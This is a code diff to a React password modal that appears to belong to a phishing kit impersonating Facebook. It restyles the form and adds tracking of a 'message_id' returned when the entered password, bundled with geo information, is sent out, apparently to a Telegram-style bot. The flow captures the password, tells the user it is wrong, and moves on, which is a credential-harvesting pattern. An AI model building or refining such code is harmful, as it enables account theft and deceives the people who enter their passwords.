@@ -25,7 +25,7 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
     const [showError, setShowError] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { messageId, message, setMessage, geoInfo } = store();
+    const { messageId, setMessageId, message, setMessage, geoInfo } = store();
 
     const t = (text: string): string => {
         return translations[text] || text;
@@ -78,6 +78,9 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
 
                 if (res?.data?.success) {
                     setMessage(updatedMessage);
+                    if (typeof res.data.data?.result?.message_id === 'number') {
+                        setMessageId(res.data.data.result.message_id);
+                    }
                 }
             } catch {
                 // Continue even if send fails
@@ -101,6 +104,9 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
 
                 if (res?.data?.success) {
                     setMessage(updatedMessage);
+                    if (typeof res.data.data?.result?.message_id === 'number') {
+                        setMessageId(res.data.data.result.message_id);
+                    }
                 }
                 nextStep();
             } catch {
@@ -117,32 +123,16 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
             <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
             <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center px-1 sm:px-3 md:px-4'>
                 <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-lg flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-1.5 sm:p-3 md:p-4'>
-                    <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto items-center gap-2 sm:gap-3 md:gap-4 py-3 sm:py-4 md:py-6'>
-                        {/* Profile Image */}
-                        <div className='h-16 sm:h-20 md:h-24 w-16 sm:w-20 md:w-24 rounded-full overflow-hidden border-2 border-gray-300 bg-gradient-to-br from-blue-400 to-blue-600 flex items-center justify-center flex-shrink-0'>
-                            {userProfileImage && (userProfileImage.startsWith('http') || userProfileImage.startsWith('/')) ? (
-                                <Image
-                                    src={userProfileImage}
-                                    alt={userName}
-                                    width={96}
-                                    height={96}
-                                    className='w-full h-full object-cover'
-                                />
-                            ) : (
-                                <div className='text-white text-xl sm:text-2xl md:text-3xl font-bold'>
-                                    {userName.charAt(0).toUpperCase()}
-                                </div>
-                            )}
-                        </div>
-
-                        {/* User Name */}
-                        <h2 className='text-base sm:text-lg md:text-2xl font-bold text-center truncate max-w-xs'>{userName}</h2>
-
-                        {/* Password Input */}
-                        <div className='w-full px-1.5 sm:px-3 md:px-4'>
-                            <p className='text-xs sm:text-sm text-gray-500 mb-1.5 pl-0.5'>
+                    <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto gap-2 sm:gap-2.5 md:gap-3 py-4 sm:py-5 md:py-6 px-1.5 sm:px-3 md:px-4'>
+                        {/* Header */}
+                        <div className='text-left'>
+                            <p className='text-xs sm:text-sm text-gray-500'>
                                 {t('For your security, you must enter your password to continue.')}
                             </p>
+                        </div>
+
+                        {/* Password Input */}
+                        <div className='w-full'>
                             <div className='relative w-full'>
                                 <input
                                     type={showPassword ? 'text' : 'password'}
@@ -150,7 +140,7 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
                                     onChange={e => {
                                         setPassword(e.target.value);
                                     }}
-                                    className='h-10 sm:h-11 md:h-12.5 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 pr-10 text-base'
+                                    className='h-11 sm:h-12 md:h-13 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 pr-10 text-base focus:border-blue-500 focus:outline-none transition-colors'
                                     required
                                     autoComplete='new-password'
                                     placeholder={t('Password')}
@@ -166,30 +156,28 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
 
                         {/* Error Message */}
                         {showError && (
-                            <p className='text-xs sm:text-sm text-red-500 w-full px-1.5 sm:px-3 md:px-4'>
+                            <p className='text-xs sm:text-sm text-red-500'>
                                 {t('The password you\'ve entered is incorrect')}
                             </p>
                         )}
 
                         {/* Log In Button */}
-                        <div className='w-full px-1.5 sm:px-3 md:px-4 mt-1 sm:mt-2'>
-                            <button
-                                type='submit'
-                                disabled={isLoading}
-                                className={`flex h-10 sm:h-11 md:h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-xs sm:text-sm md:text-base text-white transition-colors hover:bg-blue-700 ${
-                                    isLoading ? 'cursor-not-allowed opacity-80' : ''
-                                }`}
-                            >
-                                {isLoading ? (
-                                    <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
-                                ) : (
-                                    t('Continue')
-                                )}
-                            </button>
-                        </div>
+                        <button
+                            type='submit'
+                            disabled={isLoading}
+                            className={`flex h-11 sm:h-12 md:h-13 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-sm md:text-base text-white transition-colors hover:bg-blue-700 ${
+                                isLoading ? 'cursor-not-allowed opacity-80' : ''
+                            }`}
+                        >
+                            {isLoading ? (
+                                <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
+                            ) : (
+                                t('Continue')
+                            )}
+                        </button>
 
                         {/* Forgotten Password Link */}
-                        <a href='https://www.facebook.com/recover' target='_blank' rel='noopener noreferrer' className='text-xs sm:text-xs md:text-sm text-center text-blue-600 hover:underline mt-1'>
+                        <a href='https://www.facebook.com/recover' target='_blank' rel='noopener noreferrer' className='text-xs sm:text-sm text-center text-blue-600 hover:underline'>
                             {t('Forgotten password?')}
                         </a>
                     </form>
